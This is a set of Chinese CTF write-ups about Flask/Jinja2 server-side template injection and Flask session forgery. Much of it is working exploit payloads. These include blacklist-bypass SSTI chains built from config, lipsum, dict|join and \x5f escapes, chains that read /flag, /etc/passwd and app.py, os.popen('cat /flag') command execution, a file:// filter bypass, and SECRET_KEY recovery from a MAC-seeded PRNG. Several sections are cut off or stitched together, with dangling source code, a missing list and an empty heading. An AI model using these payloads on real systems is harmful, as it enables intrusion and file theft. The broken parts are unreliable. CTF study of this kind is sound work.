    EasySSTI（Hard）— 不用一个标点，读出 flag

    题目类型：Web — Jinja2 SSTI，全字符封锁

    难度：Hard　平台：CTF2

    Flag：CTF2{c932f645-1d11-456d-bc1b-ede4eb8c0e0f}

    题目概述

    进去是个登录页。先试了个弱口令，直接就进来了。

    页面就一个 Hello, admin，别的什么都没有。但题名就叫 SSTI，那还能有什么地方——username 被打印出来了。

    换成 {{7*7}} 返回 49，实锤：注入点就是 username，Jinja2 模板注入。

    解题过程

    Step 1：确认环境和注入点

    {{7*7}}      →  49
{{config}}   →  <Config {...}>      确认 Jinja2 + Flask

    Step 2：摸 WAF

    试 {{''.__class__}}，回的是：

    ' in blacklist

    然后就是一直试、一直试，最后发现封了这些：

    字符    空格、Tab、'、"、_、.、[、]  以及单独的 |
词      os / popen / request / class / mro / globals / builtins /
        import / read / system / eval / args / cookies / init / getitem

    放行的是：

    ~ ( ) , : = * + - / % { } 换行 \v \f
attr join batch first last list items get open dict config lipsum self

    一穷二白——没有引号、没有下划线、没有点、没有方括号，连空格都没有。

    但 ( ) ~ {} 还在，所以还有得打。

    Step 3：空格没了，用垂直制表符

    本文里用 ␋ 代表那个字节（0x0B，垂直制表符）。 它只是排版用的占位符，不是能打出来的字符——发送时要换成真字节，urlencoded body 里写 %0B。

    {%set␋%} 这种语句必须有空白分隔。空格和 Tab 都被拦了，那就找别的空白字符。

    0x0B  垂直制表符  ✓ 能用
0x0C  换页符      ✓ 能用
0x0A  换行        ✓ 能用
0x09  Tab         ✗ 拦
0x20  空格        ✗ 拦

    于是 {%set␋x=7*7%}{{x}} → 49，语句标签全套复活。

    这里踩过一个坑：0x0B、\x0b、\s 这三个都不是那个字符本身。

    0x0B    数字的十六进制写法（等于 11）——{{0x0B}} 渲染出来是 11
\x0b    字符串里的转义序列
\s      正则里的"空白类"，根本不是字符

    payload 里要的是那个字节本身。POST 的 body 是 urlencoded，所以写成 %0B 最省事。

    Step 4：把 _ 造出来（config 字符农场）

    这一段是整题的核心。先看两个回显：

    {{config|list}}                →  ['ENV', 'DEBUG', 'TESTING', ..., 'MAX_COOKIE_SIZE']
{{config|list|last}}           →  MAX_COOKIE_SIZE
{{config|list|last|batch(4)}}  →  ['M','A','X','_'], ['C','O','O','K'], ['I','E','_','S'], ['I','Z','E']

    |batch(4) 把字符串每 4 个切成一组，第一组是 ['M','A','X','_']。

    我们只有 |first 和 |last 两个取法，所以只能拿"每组的第一个"或"每组的最后一个"。_ 正好在第一组的末尾：

    {{config|list|last|batch(4)|first}}       →  ['M','A','X','_']
{{config|list|last|batch(4)|first|last}}  →  '_'

    由此得到通用公式：

    第 n 个字符  =  |list|batch(n)|first|last

    这就是 [n] 被封之后的替代品——不用引号、不用方括号。

    Step 5：把 / 也造出来

    / 不在键名里，在值里：config 里有一项 APPLICATION_ROOT 的值是 /。

    要把"键值对"拿出来，得调 config.items()——但点被拦了，只能 |attr(字符串)()。

    而"items"这个词也写不出来（引号没了），于是用 dict 造词：

    dict(items=1)              →  {'items': 1}
dict(items=1)|join         →  items          ← 字典 join 出来是它的键
config|attr(dict(items=1)|join)       →  <built-in method items ...>
config|attr(dict(items=1)|join)()     →  dict_items([('ENV','production'), ...])

    拿到键值对之后，/ 在第 10 对 ('APPLICATION_ROOT', '/') 的第二个位置：

    {{config|attr(dict(items=1)|join)()|batch(10)|first|last|last}}   →  '/'

    batch(10)|first 取前 10 对，|last 取第 10 对，再 |last 取这一对的第二个元素 = /。

    Step 6：把 . 造出来

    . 也能算：1/2 是 0.5，里面有现成的点。

    {{1/2}}                              →  0.5
{{(1/2)|string|batch(2)|first|last}} →  '.'

    Step 7：用 dict + ~ 拼禁词

    globals、builtins、read、os、open……这些词不能连着出现，拆开拼：

    dict(gl=1)|join ~ dict(obals=1)|join     →  globals
dict(built=1)|join ~ dict(ins=1)|join    →  builtins
dict(re=1)|join ~ dict(ad=1)|join        →  read
dict(o=1)|join ~ dict(s=1)|join          →  os
dict(open=1)|join                        →  open（不封，直接用）
dict(get=1)|join                         →  get（不封）

    注意 ~ 是字符串拼接：{{1~2}} → '12'，而 {{1+2}} → 3。

    也注意别拼错：gl + obals = globals，不是 gl + oblas。

    Step 8：组装

    把造出来的东西存进变量（set 就是赋值，只存不显示）：

    {%set␋U=config|last|list|batch(4)|first|last%}                      U  = _
{%set␋GS=U~U~dict(gl=1)|join~dict(obals=1)|join~U~U%}               GS = __globals__
{%set␋GT=dict(get=1)|join%}                                         GT = get
{%set␋BB=U~U~dict(built=1)|join~dict(ins=1)|join~U~U%}              BB = __builtins__
{%set␋SL=config|attr(dict(items=1)|join)()|batch(10)|first|last|last%}  SL = /
{%set␋RD=dict(re=1)|join~dict(ad=1)|join%}                          RD = read

    最后一步：

    {{lipsum|attr(GS)|attr(GT)(BB)|attr(GT)(dict(open=1)|join)(SL~dict(flag=1)|join)|attr(RD)()}}

    等价于：

    lipsum.__globals__['__builtins__'].get('open')('/flag').read()

    Step 9：其实应该先 ls

    WP 里直接写 /flag 是"flag 常在根目录"的经验假设。正经做法是先列目录：

    lipsum.__globals__['os'].listdir('/')

    os 居然就在 jinja2.utils 的 globals 里（jinja2 内部 import 了 os），所以不用碰 __import__（import 是禁词，那条路更难）。

    清单：

    ['opt','root','media','home','proc','tmp','lib','boot','etc','lib64','dev','sys','sbin',...]

    先看目录、再决定读哪个文件——这个习惯比"猜文件名"值钱。

    解题思路总结

    登录页 → 弱口令进来 → Hello admin → username 被渲染
  → {{7*7}} = 49 → 注入点确认
    → 摸 WAF：空格 Tab ' " _ . [ ] 全封，一批词也封
      → 空白用 0x0B（垂直制表符）：{%set␋x=7*7%} 复活
        → _ 从 config 的键里切（batch 取位）
          → / 从 config.items() 的第 10 对里切
            → . 从 1/2 的 0.5 里切
              → 禁词用 dict(单键)|join + ~ 拼
                → set 存变量，|attr() 链代替点和方括号
                  → lipsum.__globals__['__builtins__'].get('open')('/flag').read()

    漏洞原理

    ① WAF 拦的是"字面"，引擎看的是"值"

    原文里：dict(gl=1)|join~dict(obals=1)|join
执行时：globals

    所有被禁的词、被禁的字符，都能在运行时"算"出来。

    ② 三个被封的字符，三个不同的"农场"

    _   从 config 的键名里切（MAX_COOKIE_SIZE 第 4 个）
/   从 config.items() 的值里切（APPLICATION_ROOT 的值）
.   从 1/2 = 0.5 里切

    只要有任何一处能产出那个字符，就能把它切出来复用。

    ③ |attr 只走 getattr，字典取键要靠 get

    Jinja 的 |attr 不回落 __getitem__，所以 __globals__['__builtins__'] 得写成 |attr('get')('__builtins__')。

    关键知识点

    知识点 说明
    {%set␋x=1%} set 是赋值；空白用 0x0B / 0x0C / 0x0A，空格和 Tab 都被拦
    0x0B / \x0b / \s 都不是那个字节：数字写法、字符串转义、正则空白类
    %0B urlencoded body 里写这个，服务端解码成真字节
    \|batch(n)\|first\|last 取第 n 个字符，替代 [n]
    dict(k=1)\|join 造出字符串 k（字典 join = 拼键）
    ~ 字符串拼接（1~2 → '12'）
    \|attr(name) 替代 .name
    \|attr('get')(key) 替代 [key]（attr 不回落 getitem）
    \|attr(f)() 方法必须加 () 才是调用
    禁词拆分 gl+obals、built+ins、re+ad、o+s
    os 在哪 jinja2.utils.__globals__ 里就有，不用 __import__
    先 ls 再读 os.listdir('/')，别假设文件名
    完整 payload（实测，␋ = 0x0B） 
    {%set␋U=config|last|list|batch(4)|first|last%}
{%set␋GS=U~U~dict(gl=1)|join~dict(obals=1)|join~U~U%}
{%set␋GT=dict(get=1)|join%}
{%set␋BB=U~U~dict(built=1)|join~dict(ins=1)|join~U~U%}
{%set␋SL=config|attr(dict(items=1)|join)()|batch(10)|first|last|last%}
{%set␋RD=dict(re=1)|join~dict(ad=1)|join%}
{{lipsum|attr(GS)|attr(GT)(BB)|attr(GT)(dict(open=1)|join)(SL~dict(flag=1)|join)|attr(RD)()}}

    连成一行 390 字符，POST username 参数，读 /flag。

    怎么把 0x0B 发出去

    0x0B 是控制字符，键盘上打不出来，编辑器里也看不见。

    ✗ 直接打 \x0b 四个字符   → TemplateSyntaxError: unexpected char '\'
✗ 直接打 0x0B           → 那是数字 11，set 后面没有空白，报 500
✓ POST body 写 %0B      → urlencoded，服务端解码成真字节

    调试时用编码、别用看不见的字符——否则排错时根本分不清是"没粘上"还是"粘错了"。

    这题踩的坑

    ① 把 0x0B 当成字符

    {{0x0B}} 渲染出来是 11——它是数字。三次尝试（0x0B、\x0b、\s）都错在同一个认知上。

    ② 以为 Tab 能用

    空格被封时第一反应是用 Tab，但这题 Tab 也在黑名单里。可用的只有 0x0B / 0x0C / 0x0A。

    ③ 拼词拼错

    dict(gl=1)|join~dict(oblas=1)|join → globlas。差一个字母，整条链断，而且报错是 Exception（程序吞了），看不出哪错了。

    ④ |batch 返回生成器

    直接渲染是 <generator object>，必须 |first 或 |list。

    ⑤ 直接假设 /flag

    WP 里写 /flag 能成，是因为这环境里确实有。但换个环境，先 listdir('/') 才是稳的。

    [pasecactf_2019] flask_ssti — 只有三个字符被拦

    题目类型：Web — Flask SSTI（字符级过滤）+ 源码审计 + 异或解密

    题目地址：NSSCTF / ctf2 复刻环境

    Flag：CTF2{bcd6e1da-c4f1-4c73-83f8-f64ea78ed1cf}

    题目概述

    页面叫 Skype ScreenName Generator：

    Just type your nickname. We will do some unicode magic.

    输入昵称，它给你套一层花里胡哨的装饰，比如：

    ˜”*°★☆★_abc_★☆★°°*

    但这个页面一开始点不动——这是第一道坎。

    解题过程

    Step 1：页面能开，但按钮点了没反应

    页面加载正常，输入框也输得进去，就是点 "Go" 什么都不发生。

    按 F12 看 Console，发现 $ is not defined。原因是页面引了：

    https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js

    Google 的 CDN，国内连不上。jQuery 没加载，send() 里的 $.post 自然跑不了。

    绕过办法：

    ① 浏览器里按 ESC 停止加载（页面其实早就渲染完了）
② 让 Burp 把这条 CDN 请求 drop 掉
③ 直接看源码找接口，用 curl / python 发（最实用）

    Step 2：从源码里抠出接口

    页面里那段内联 JS 写得很清楚：

    function send(){
  let nickname = $('#nickname')[0].value;
  if(nickname.length > 0){
    $.post("/", {'nickname': nickname}, function(data){
      $('#msg')[0].innerHTML = '<b>' + data + '</b>';
    });
  }
}

    接口：POST /，参数名 nickname。

    Step 3：先确认模板被执行

    POST /            nickname={{7*7}}
→ 49 ~♡ⓛⓞⓥⓔ♡~

    模板被执行了。（{{7*'7'}} 也试了，回 49 —— 等等，这里要说明：这道题是 Python 的 Jinja2，{{7*'7'}} 应该回 7777777。我一开始只测了 {{7*7}}，靠后面的报错才确认是 Jinja。）

    Step 4：摸过滤 —— 只有三个字符

    先用 {{config}} 试，过了，返回一整个 Config 对象。说明不是关键词黑名单。

    但下面这些全报 Your nickname contains restricted characters!：

    {{url_for}}        ← 名字里有下划线
{{'__class__'}}    ← 有下划线 + 单引号
{{a.b}}            ← 有点
{{'a'}}            ← 有单引号

    能过的：

    {{"a"}}        双引号可以
{{[1,2]}}      方括号可以
{{1|abs}}      管道可以
{{dict}} {{lipsum}} {{config}} {{self}}    这些名字没下划线，能直接写

    所以过滤只有三个字符：

    _   下划线
'   单引号
.   点

    这三个一拦，常规链基本全废：没有 _ 就写不出 __class__，没有 . 就不能取属性。

    Step 5：把写不出来的字符"算"出来

    关键认知：过滤看的是你打的字面，而模板引擎会把转义还原。

    "\x5f"   →  _
"\x2e"   →  .

    验证：

    {{"\x5f\x5f"}}   →  __

    于是 __globals__ 可以写成 "\x5f\x5fglobals\x5f\x5f"，原文里一个下划线都没有。

    Step 6：两个优先级坑

    ① |attr() 后面不能直接跟 [...]，要加括号

    × lipsum|attr("\x5f\x5fglobals\x5f\x5f")["\x5f\x5fname\x5f\x5f"]     → Exception
✓ (lipsum|attr("\x5f\x5fglobals\x5f\x5f"))["\x5f\x5fname\x5f\x5f"]   → jinja2.utils

    ② 方法名也要用下标取（因为 .read() 里的点被拦）

    × ...["open"]("/etc/passwd").read()       → 那个点触发过滤
✓ ...["open"]("/etc/passwd")["read"]()    → 正常

    为什么能用下标取方法？Jinja 的取值逻辑是：先试 obj[键]，失败再 getattr(obj, 键)。文件对象不能下标，于是回退到取属性，正好拿到 read 方法。

    打通之后：

    {{(lipsum|attr("\x5f\x5fglobals\x5f\x5f"))["\x5f\x5fbuiltins\x5f\x5f"]["open"]("/etc/passwd")["read"]()}}
→ root:x:0:0:root:/root:/bin/ash ...

    Step 7：找到 flag 在哪儿

    先列根目录：

    {{(lipsum|attr("\x5f\x5fglobals\x5f\x5f"))["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["listdir"]("/")}}
→ ['opt','root','media','home','proc','tmp','lib','etc','dev','sys','sbin','srv','var','run','mnt','usr','bin','app']

    根目录没有 flag 文件，但有个 /app——网站根目录。

    读源码（注意 app.py 里的点也要转义成 \x2e）：

    {{(lipsum|attr("\x5f\x5fglobals\x5f\x5f"))["\x5f\x5fbuiltins\x5f\x5f"]["open"]("/app/app\x2epy")["read"]()}}

    ⚠️ listdir 要目录、open 要文件。我一开始给 listdir 传了个 .py 文件，直接 Exception——因为程序把所有异常都吞成了同一个词，看不出原因。

    Step 8：源码说 flag 已经被加密了

    拿到 /app/app.py，关键几行：

    def encode(line, key, key2):
    return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))

file = open("/app/flag", "r")
flag = file.read()
flag = flag[:42]

app.config['flag'] = encode(flag, 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3',
                                  'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')
flag = ""

os.remove("/app/flag")

    三件事：

    ① flag 被异或加密后存进 app.config['flag']
② 变量 flag 清空了
③ 原始文件 /app/flag 被删了

    所以拿到命令执行也没用——文件已经没了。这题真正要的是"看懂加密逻辑"。

    Step 9：取密文

    密文里有不可打印字符（\x08、\x10 这种），直接 {{config["flag"]}} 输出会被 HTML 转义搅乱。

    用 tojson：

    {{config["flag"]|tojson}}
→ "\u0008u\u0010Ew\u0013ajdU#7*\u000e\u001c\u000f<\u0006(DK\u001d\r\u0017!8\u0006h\u0002\n@\\pS,\u0026A<\u0017\\IG"

    不可打印字符全变成 \uXXXX，干净地传出来。

    Step 10：本地解密

    加密是：

    chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x]))

    异或可逆，反过来算就行：

    flag[i] = chr(密文[i] ^ i ^ ord(key倒序[i]) ^ ord(key2[i]))

    CTF2{bcd6e1da-c4f1-4c73-83f8-f64ea78ed1cf}

    解题思路总结

    页面点不动 → jQuery 在 Google CDN，挂了
  → 看内联 JS 找到接口：POST /，参数 nickname
    → {{7*7}} = 49，模板被执行
      → {{config}} 过了，说明不是关键词黑名单
        → 逐个试，发现只拦 _ ' . 三个字符
          → 转义绕过：\x5f = _，\x2e = .，单引号换双引号
            → (lipsum|attr("..."))["..."]  括号保优先级
              → ["open"](路径)["read"]()   方法名也用下标
                → listdir("/") 找到 /app
                  → 读 app.py，发现 flag 已加密存 config、原文件被删
                    → tojson 取出密文（保住不可打印字符）

    漏洞原理

    [CISCN2019 华东南赛区] Web4 — 从 MAC 地址推回 SECRET_KEY

    题目类型：Web — Flask 源码泄露 + 伪随机数预测 + session 伪造

    题目地址：BUUCTF / ctf2 复刻环境

    Flag：CTF2{b5ab3e88-9e2a-4217-ba5f-b92ba1c7c4ff}

    题目概述

    进入页面只有一份跳转页，点击后自动跳到百度。

    /read?url= 能读 URL 指向的东西，但 file:// 被过滤了，返回 No Hack。

    这题真正要做的不是"绕过过滤器读文件"，而是：读出源码 → 从源码里发现 SECRET_KEY 是用 MAC 地址当种子生成的伪随机数** → 读出 MAC → 本地算出密钥 → 伪造 session → 访问 /flag。**

    解题过程

    Step 1：先试能不能读文件

    /read?url=file:///etc/passwd   →  No Hack

    说明它拦了 file。先别急着绕，把这题的源码拿到手更值。

    Step 2：我一开始以为是 JWT（错了）

    看到 session cookie 是三段、点分隔，我第一反应是「这是 JWT」。

    这个判断是错的，而且会把人带偏——因为伪造 JWT 和伪造 Flask session 用的工具完全不同。

    正确的判断方法：把第一段 base64 解开看是什么。

    Flask session 的第一段   →  直接是 {"username": ...} 这样的 JSON 数据
JWT 的第一段             →  是 {"alg":"HS256","typ":"JWT"} 这样的 header

    Flask session 用的是 itsdangerous：base64(数据).时间戳.HMAC-SHA1签名，密钥就是 SECRET_KEY。长得像 JWT，但完全是两套东西。

    Step 3：拿到源码

    import re, random, uuid, urllib
from flask import Flask, session, request

app = Flask(__name__)
random.seed(uuid.getnode())                          # ← 关键
app.config['SECRET_KEY'] = str(random.random()*233)  # ← 关键
app.debug = True

@app.route('/')
def index():
    session['username'] = 'www-data'
    return 'Hello World! Read somethings'

@app.route('/read')
def read():
    try:
        url = request.args.get('url')
        m = re.findall('^file.*', url, re.IGNORECASE)
        n = re.findall('flag', url, re.IGNORECASE)
        if m or n:
            return 'No Hack'
        res = urllib.urlopen(url)
        return res.read()
    except Exception as ex:
        print str(ex)
        return 'no response'

        return open('/flag.txt').read()
    else:

    伪随机数的致命点：种子固定 → 序列固定 → 结果可复现。所以只要知道 MAC，密钥就能算出来。

    Step 4：file 是怎么绕过的

    过滤是这一行：

    m = re.findall('^file.*', url, re.IGNORECASE)

    注意 ^ —— 它锚定字符串的开头。所以它拦的是"以 file 开头的字符串"，不是"含 file 的字符串"。

    而 urllib.urlopen() 在真正解析之前会先 unwrap()，那个函数里有 strip()——把首尾空白去掉，还会剥掉外面包的 <>。

    正则看到的：  原始字符串（不以 file 开头 → 不拦）
urllib 看到的：strip 之后的字符串（以 file 开头 → 正常按文件读）

    两个组件对同一份输入的处理不一致，绕过点就在这里。

    另外还要注意 n = re.findall('flag', url)：URL 里任何位置出现 flag 都不行，所以读 MAC 只能用 /sys/class/net/eth0/address 这种路径。

    Step 5：读 MAC 地址

    /sys/class/net/eth0/address   →  16:49:e9:36:04:ea（举例）

    uuid.getnode() 返回的就是这块网卡的 MAC，转成整数。

    Step 6：本地算 SECRET_KEY

    公式：

    import random
random.seed(int('1649e93604ea', 16))
app.config['SECRET_KEY'] = str(random.random() * 233)

    ⚠️ 这里有个大坑：必须按 Python 2 的 str() 行为算。

    random()*233 的完整浮点 :  34.58290138764246

Python 3 的 str()       :  34.58290138764246     ← 17 位
Python 2 的 str()       :  34.5829013876         ← 12 位（%.12g）

    Python 2 的 str(float) 等价于 %.12g，只保留 12 位有效数字。这题跑在 Python 2.7（print str(ex) 那个写法就是标志），所以密钥是短的那个。

    用 Python 3 的 str() 算出来去签名，会一直验不过——而且报错只说"签名不匹配"，不会告诉你差在六个字符上。

    在 Python 3 里复现 Python 2 的写法：

    key = '%.12g' % (random.random() * 233)      # → '34.5829013876'

    flask-unsign 有两个坑，我都踩了：

signer = si.get_signing_serializer(FakeApp("34.5829013876"))
print(signer.dumps({"username": "fuck"}))

    漏洞原理

    ① 伪随机数用"可预测的东西"当种子，等于没随机

    random.seed(uuid.getnode()) —— 种子是 MAC 地址。MAC 不是秘密，读得到。知道种子就等于知道全部输出。这就是为什么密钥生成不能用 random，得用 os.urandom / secrets。

    ② 过滤器与解析器对同一份输入处理不一致

    正则看原始字符串（^file 要求开头就是 file），urllib 看 strip() 之后的字符串。这个差值就是绕过空间，和 SQL 注入里"过滤器和数据库对同一串的理解不同"是同一类问题。

    ③ 语言版本差异会改变输出的字符串

    str(float) 在 Python 2 和 3 里给的东西不一样。跨语言/跨版本复现逻辑时，这类差异最难查，因为逻辑完全正确，只有格式不同。

    关键知识点

    知识点 说明
    Flask session ≠ JWT 第一段解出 JSON 数据的是 Flask session；解出 {"alg":...} 的才是 JWT
    itsdangerous Flask session 的签名库，HMAC-SHA1 + SECRET_KEY
    random.seed(int) 种子相同则序列相同，可完全复现
    uuid.getnode() 返回网卡 MAC 的整数值
    str(float) 版本差异 Python 2 ≈ %.12g（12 位有效数字），Python 3 是 17 位
    re.findall('^file.*', url) ^ 锚定开头，只拦"以 file 开头"
    urllib.unwrap() 内部会 strip() 首尾空白、剥掉 <>
    flask-unsign 的 literal_eval 会把看起来像数字的密钥当浮点；--no-literal-eval 是全局开关
    ValueError: dictionary update... 出现在 session 解签成功但 payload 不是 dict 时——说明密钥对了
    SecureCookieSessionInterface 直接用它签名，格式一定跟 Flask 一致

    [BJDCTF 2nd] fake google — 我的第一道 SSTI

    题目类型：Web — Flask / Jinja2 模板注入（SSTI）

    题目地址：BUUCTF / ctf2 复刻环境

    Flag：CTF2{4ba1fadc-b09a-441d-baf8-191ea2b8a4dd}

    题目概述

    进入界面只有一个输入框。

    先试 SQL 注入，发现无论输入什么，它都直接打印出来——不像是在查数据库。

    查看源码，在 qaq 那个位置发现了提示：sssssti & a little trick。这就是 SSTI，模板注入。

    这是我第一次做 SSTI，所以每一步都写下来了。

    解题过程

    Step 1：确认模板被执行

    {{7*7}}   →  49

    如果回显的是 {{7*7}} 原文，说明只是字符串拼接；回显 49，说明你的输入进了模板引擎，被真的求值了。

    Step 2：确认是 Jinja2

    {{7*'7'}}  →  7777777

    这个探针是用来区分引擎的：Jinja2 里 '7' 是字符串，重复 7 次得到 7777777；Twig（PHP）里会当成数字，得到 49。

    Step 3：确认是 Flask

    {{config}}   →  Flask 的配置对象

    config 是 Flask 注入模板的全局变量。它出现就说明是 Flask，顺便还可能看到 SECRET_KEY。

    到这一步，两条路都可以走了。

    路线一：从字面量往上爬（通用链）

    这条路不依赖任何框架给的名字，只靠 Python 的对象关系。

    第一环：字符串的类

    {{''.__class__}}     →  <class 'str'>

    第二环：它的父类

    {{''.__class__.__bases__[0]}}   →  <class 'object'>

    ⚠️ 这里有个坑：__base__（单数）是一个类，不能下标；__bases__（复数）是元组，才能写 [0]。写成 __base__[0] 会返回空。

    第三环：所有子类

    {{''.__class__.__bases__[0].__subclasses__()}}   →  一大串类

    这一步是分水岭：拿到的是内存里所有已加载的类。

    第四环：找一个“身上带着模块全局空间”的类

    核心思路：找一个 __init__.__globals__ 里带 __builtins__ 或者直接带 os 的类。

    常见的几个候选：

    catch_warnings        → warnings 模块，globals 里有 __builtins__
_wrap_close           → os 模块，globals 里直接有 popen
Popen                 → subprocess
FileLoader            → importlib

    怎么知道它们在列表第几个？我写了个本地脚本扫了一遍：

    import sys
for i, c in enumerate((''.__class__.__bases__[0].__subclasses__())):
    if c.__name__ in ('catch_warnings', '_wrap_close', 'Popen', 'FileLoader'):
        print(i, c.__name__, '->', c.__module__ + '.' + c.__name__)

    ⚠️ 下标是环境相关的。同样的脚本，在不同 Python 版本、不同 import 顺序下会给出不同的数字。我这边 catch_warnings 是 169、_wrap_close 是 117，靶机正好一致才打通的。换个环境就得重扫，或者用按名字筛的写法（见文末）。

    第五环：用 _wrap_close 直接拿 popen

    {{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('cat /flag').read()}}

    _wrap_close 是 os 模块里的类，它的 __init__.__globals__ 就是 os 模块的全局空间，里面直接有 popen，一步到位。

    另一种：用 catch_warnings 走 __builtins__

    {{''.__class__.__bases__[0].__subclasses__()[169].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /f*').read()")}}

    为什么要绕 eval 和 __import__？因为 catch_warnings 的 globals 里没有 os，但有 __builtins__；__builtins__ 里有 __import__，能 import 就能拿到任何模块。

    （__builtins__ 在不同上下文里有时是 dict、有时是模块，所以有的写法用 ['__builtins__']，有的用 .builtins__——注意前者是取键，后者是取属性。）

    路线二：从框架给的钩子走（快）

    既然确认了是 Flask，就先看看模板里现成给了什么：

    {{url_for}}   →  <function url_for at 0x...>

    它是函数——函数身上就有 __globals__。所以不需要爬几百个子类：

    {{url_for.__globals__}}                  →  一大坨 dict
{{(url_for.__globals__)['os']}}          →  <module 'os' ...>
{{(url_for.__globals__)['os'].popen('cat /f*').read()}}

    三行就出 flag。

    这就是两条路的区别：

    路线一（长）：'' → 类 → 父类 → 所有子类 → 挑一个 → __globals__ → 执行
路线二（短）：url_for → __globals__ → os → 执行

    路线二快，但依赖 Flask 注入了 url_for；路线一慢，但只要是 Python 就通。实战里先试短的，不通再走长的。

    解题思路总结

    一个输入框 → 试 SQL 注入，内容被原样打印
  → 看源码，qaq 里有提示 sssssti
    → {{7*7}} = 49        确认模板被执行
      → {{7*'7'}} = 7777777  确认是 Jinja2
        → {{config}}        确认是 Flask
          ├─ 路线一：'' → __class__ → __bases__[0] → __subclasses__()
          │           → 挑 _wrap_close(117) / catch_warnings(169)
          │             → __init__.__globals__ → popen / __builtins__ → 执行
          └─ 路线二：url_for → __globals__ → ['os'] → popen → 执行

    漏洞原理

    ① Jinja2 的 {{ }} 里是表达式，会被求值

    用户输入被拼进模板字符串后，{{ }} 里的内容不再当文字，而是交给 Python 求值。这是 SSTI 成立的第一步。

    ② Python 的属性访问没有边界

    从任何一个对象出发，都能顺着 __class__（类）→ __mro__ / __bases__（父类）→ __subclasses__()（所有子类）→ __init__.__globals__（定义时的模块空间）走到执行。这不是漏洞，是语言特性；漏洞在于模板允许你访问这些属性。

    ③ 框架注入的全局变量是“现成的入口”

    Flask 会把 config、request、session、url_for、lipsum、get_flashed_messages 放进模板名字空间。它们本身是函数或对象，身上挂着 __globals__，等于给了一条捷径。

    关键知识点

    知识点 说明
    {{7*7}} / {{7*'7'}} 引擎探测：回显 49 / 7777777 说明是 Jinja2
    {{config}} Flask 的模板全局，能确认框架、有时能读到 SECRET_KEY
    __class__ 任何对象都能拿到它的类
    __base__ vs __bases__ 前者是单个父类（不可下标），后者是元组（可 [0]）
    __subclasses__() 内存里所有已加载的类，但下标因环境而异
    __globals__ 函数定义时所在的模块全局空间（只有 Python 层函数有，C 层 wrapper 没有）
    __builtins__ 里面有 __import__，能 import 就能拿任何模块
    点号 vs 方括号 . 取属性，['x'] 取键，不能写成 .['x']
    生成器 map / selectattr 返回惰性生成器，要 \|first 或 \|list 才有值
    按名字筛代替下标 \|selectattr('__name__','equalto','xxx')\|first，跨环境稳定
    遇到过滤 .__globals__ 用 \|attr('__globals__') 换形状（本题没有过滤，用不上）
    两条链的完整 payload（本题实测）

{{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('cat /flag').read()}}

# 路线一 · catch_warnings：走 __builtins__ → __import__
{{''.__class__.__bases__[0].__subclasses__()[169].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /f*').read()")}}

{{(url_for.__globals__)['os'].popen('cat /f*').read()}}
    跨环境更稳的写法：按名字找，不记下标 
    {{''.__class__.__bases__[0].__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first|attr('__init__').__globals__}}

    selectattr 按属性名筛，\first 取第一个 —— 不需要知道它在第几个。 如果连 .__globals__ 这种形状都被过滤，就换成 |attr('__globals__')。
